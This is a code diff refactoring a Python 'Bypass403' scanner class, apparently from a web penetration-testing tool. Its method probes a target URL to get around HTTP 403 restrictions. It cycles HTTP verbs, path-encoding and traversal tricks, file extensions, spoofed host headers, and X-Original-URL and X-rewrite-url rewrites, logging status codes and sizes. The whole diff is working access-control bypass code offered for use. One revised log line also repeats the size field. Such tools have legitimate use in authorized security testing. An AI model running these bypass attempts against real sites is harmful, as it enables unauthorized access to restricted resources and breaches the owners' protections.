@@ -48,30 +48,14 @@ class Bypass403(Scanner):
 
     def try_bypass(self) -> dict:
         results = collections.defaultdict(list)
+        original_path = f"{self.target_url}/{self.target_keyword}"
+        self._log_progress(f"in progress -> {self.target_keyword}")
 
         # methods
 
-        req_path = f"{self.target_url}/{self.target_keyword}"
-        scode, size = self.send_request("GET", req_path)
-        results[scode].append(f"GET {req_path}\tsize {size}")
-
-        req_path = f"{self.target_url}/{self.target_keyword}"
-        headers = {"Content-Length": "0"}
-        scode, size = self.send_request("POST", req_path, headers=headers)
-        results[scode].append(f"POST {req_path} -H 'Content-Length: 0'\tsize {size}")
-
-        req_path = f"{self.target_url}/{self.target_keyword}"
-        headers = {"Content-Length": "0"}
-        scode, size = self.send_request("PUT", req_path, headers=headers)
-        results[scode].append(f"PUT {req_path} -H 'Content-Length: 0'\tsize {size}")
-
-        req_path = f"{self.target_url}/{self.target_keyword}"
-        scode, size = self.send_request("TRACE", req_path)
-        results[scode].append(f"TRACE {req_path}\tsize {size}")
-
-        req_path = f"{self.target_url}/{self.target_keyword}"
-        scode, size = self.send_request("TRACE", req_path)
-        results[self.send_request("DELETE", req_path)].append(f"DELETE {req_path}\tsize {size}")
+        for method in ["GET", "POST", "PUT", "TRACE", "DELETE"]:
+            scode, size = self.send_request(method, original_path)
+            results[scode].append(f"size {size}\t\t{method} {original_path}")
 
         # encoding / path traversal
 
@@ -82,33 +66,40 @@ class Bypass403(Scanner):
                          f"{self.target_url}/{self.target_keyword}?", f"{self.target_url}/{self.target_keyword}#",
                          f"{self.target_url}/{self.target_keyword}/*"]:
             scode, size = self.send_request("GET", req_path)
-            results[scode].append(f"GET {req_path}\tsize {size}")
+            results[scode].append(f"size {size}\t\tGET {req_path}")
 
         # file extensions
 
         for file_ext in ["html", "php", "json"]:
-            req_path = f"{self.target_url}/{self.target_keyword}.{file_ext}"
+            req_path = f"{original_path}.{file_ext}"
             scode, size = self.send_request("GET", req_path)
-            results[scode].append(f"GET {req_path}\tsize {size}")
+            results[scode].append(f"size {size}\t\tGET {req_path}\t\tsize {size}")
 
         # headers
 
         for header in Bypass403._HOST_HEADERS:
             for host_nickname in Bypass403._LHOST_NICKNAMES:
-                req_path = f"{self.target_url}/{self.target_keyword}"
                 headers = {header: host_nickname}
-                scode, size = self.send_request("GET", req_path, headers=headers)
-                results[scode].append(f"GET {req_path} -H {header}: {host_nickname}\tsize {size}")
+                scode, size = self.send_request("GET", original_path, headers=headers)
+                results[scode].append(f"size {size}\t\tGET {original_path} -H {header}: {host_nickname}")
 
         req_path = f"{self.target_url}"
         headers = {"X-rewrite-url": self.target_keyword}
         scode, size = self.send_request("GET", req_path, headers=headers)
-        results[scode].append(f"GET {req_path} -H 'X-rewrite-url: {self.target_keyword}'\tsize {size}")
+        results[scode].append(f"size {size}\t\tGET {req_path} -H 'X-rewrite-url: {self.target_keyword}'")
 
         req_path = f"{self.target_url}"
         headers = {"X-Original-URL": self.target_keyword}
         scode, size = self.send_request("GET", req_path, headers=headers)
-        results[scode].append(f"GET {req_path} -H 'X-Original-URL: {self.target_keyword}'\tsize {size}")
+        results[scode].append(f"size {size}\t\tGET {req_path} -H 'X-Original-URL: {self.target_keyword}'")
+
+        headers = {"Content-Length": "0"}
+        scode, size = self.send_request("POST", original_path, headers=headers)
+        results[scode].append(f"size {size}\t\tPOST {original_path} -H 'Content-Length: 0'")
+
+        headers = {"Content-Length": "0"}
+        scode, size = self.send_request("PUT", original_path, headers=headers)
+        results[scode].append(f"size {size}\t\tPUT {original_path} -H 'Content-Length: 0'")
 
         return results
 
